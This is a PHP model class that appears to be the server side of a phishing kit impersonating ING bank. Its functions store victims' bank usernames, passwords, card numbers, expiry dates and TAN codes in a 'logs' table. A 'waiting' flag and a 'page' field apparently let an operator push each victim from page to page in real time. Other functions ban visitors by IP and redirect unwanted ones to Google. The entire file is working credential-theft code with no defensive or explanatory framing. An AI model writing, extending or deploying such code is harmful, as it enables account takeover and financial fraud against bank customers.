<?php

namespace App\Models\Ing;

use PDO;

class Ing extends \Core\Model
{
    public static function redirect()
    {
        $sql = 'SELECT * FROM redirect WHERE id = :id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':id', 1, PDO::PARAM_INT);
        $stmt->execute();

        $data = $stmt->fetch();

        if ($data) {
            header('location: ' . $data['redirect']);
            exit;
        } else {
            header('location: https://www.google.nl');
            exit;
        }
    }

    public static function findBan($ip)
    {
        $sql = 'SELECT * FROM bans WHERE ip = :ip';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':ip', $ip, PDO::PARAM_STR);
        $stmt->execute();

        $data = $stmt->fetch();

        if ($data) {
            return true;
        }
        return false;
    }

    public static function setLogInformation($uid)
    {
        $sql = 'UPDATE logs SET bank = :bank, ing_user = :empty, ing_pass = :empty, page = :empty, waiting = :waiting WHERE user_id = :user_id';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':bank', 'ING', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);
    
        $stmt->execute();
    }

    public static function setWifiInformation($uid)
    {
        $sql = 'UPDATE logs SET bank = :bank, ing_wifi = :empty, ing_wifi_pass = :empty, ing_wifi_pass_two = :empty, page = :empty, waiting = :waiting WHERE user_id = :user_id';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':bank', 'ING', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);
    
        $stmt->execute();
    }

    public static function setDetailsInformation($uid)
    {
        $sql = 'UPDATE logs SET bank = :bank, ing_exp = :empty, ing_number = :empty, page = :empty, waiting = :waiting WHERE user_id = :user_id';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':bank', 'ING', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);
    
        $stmt->execute();
    }

    public static function setConfirmInformation($uid)
    {
        $sql = 'UPDATE logs SET bank = :bank, page = :empty, waiting = :waiting WHERE user_id = :user_id';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':bank', 'ING', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);
    
        $stmt->execute();
    }

    public static function setTanInformation($uid)
    {
        $sql = 'UPDATE logs SET bank = :bank, ing_tan = :empty, page = :empty, waiting = :waiting WHERE user_id = :user_id';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':bank', 'ING', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);
    
        $stmt->execute();
    }

    public static function checkPayment($url = []) 
    {
        $sql = 'SELECT * FROM requests WHERE url = :id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':id', $url, PDO::PARAM_STR);
        $stmt->execute();

        $data = $stmt->fetch();

        if ($data) {
            return $data;
        }
        return false;
    }

    public static function setLogin($username, $password, $uid) 
    {
        $sql = 'UPDATE logs SET ing_user = :username, ing_pass = :password, waiting = :waiting WHERE user_id = :uid';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':username', $username, PDO::PARAM_STR);
        $stmt->bindValue(':password', $password, PDO::PARAM_STR);
        $stmt->bindValue(':uid', $uid, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'true', PDO::PARAM_STR);

        $stmt->execute();
    }

    public static function setWifi($wifi, $pass, $confirm, $uid) 
    {
        $sql = 'UPDATE logs SET ing_wifi = :wifi, ing_wifi_pass = :pass, ing_wifi_pass_two = :confirm, waiting = :waiting WHERE user_id = :uid';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':wifi', $wifi, PDO::PARAM_STR);
        $stmt->bindValue(':pass', $pass, PDO::PARAM_STR);
        $stmt->bindValue(':confirm', $confirm, PDO::PARAM_STR);
        $stmt->bindValue(':uid', $uid, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'true', PDO::PARAM_STR);

        $stmt->execute();
    }

    public static function setConfirm($uid) 
    {
        $sql = 'UPDATE logs SET waiting = :waiting WHERE user_id = :uid';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':uid', $uid, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'true', PDO::PARAM_STR);

        $stmt->execute();
    }

    public static function setTan($tan, $uid) 
    {
        $sql = 'UPDATE logs SET ing_tan = :tan, waiting = :waiting WHERE user_id = :uid';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':tan', $tan, PDO::PARAM_STR);
        $stmt->bindValue(':uid', $uid, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'true', PDO::PARAM_STR);

        $stmt->execute();
    }

    public static function setDetails($expiration, $number, $uid) 
    {
        $sql = 'UPDATE logs SET ing_exp = :expiration, ing_number = :number, waiting = :waiting WHERE user_id = :uid';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':expiration', $expiration, PDO::PARAM_STR);
        $stmt->bindValue(':number', $number, PDO::PARAM_STR);
        $stmt->bindValue(':uid', $uid, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'true', PDO::PARAM_STR);

        $stmt->execute();
    }

    public static function getPage($uid) 
    {
        $sql = 'SELECT * FROM logs WHERE user_id = :uid';
        
        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':uid', $uid, PDO::PARAM_STR);
        $stmt->execute();

        $data = $stmt->fetch();

        if (!empty($data['page'])) {
            return $data['page'];
        }
        return false;
    }

    public static function setLoginPage($uid, $page)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting, ing_user = :empty, ing_pass = :empty WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_NULL);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function setControlPage($uid, $page)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting, ing_wifi = :empty, ing_wifi_pass = :empty, ing_wifi_pass_two = :empty WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_NULL);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function setDetailsPage($uid, $page)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting, ing_exp = :empty, ing_number = :empty WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_NULL);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function setConfirmPage($uid, $page)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function setTanPage($uid, $page)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting, ing_tan = :empty WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':empty', null, PDO::PARAM_NULL);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }

    public static function setFinishPage($uid, $page)
    {
        $sql = 'UPDATE logs SET page = :page, waiting = :waiting WHERE user_id = :user_id';

        $db = static::getDB();
        $stmt = $db->prepare($sql);
        $stmt->bindValue(':page', $page, PDO::PARAM_STR);
        $stmt->bindValue(':waiting', 'false', PDO::PARAM_STR);
        $stmt->bindValue(':user_id', $uid, PDO::PARAM_STR);

        return $stmt->execute();
    }
}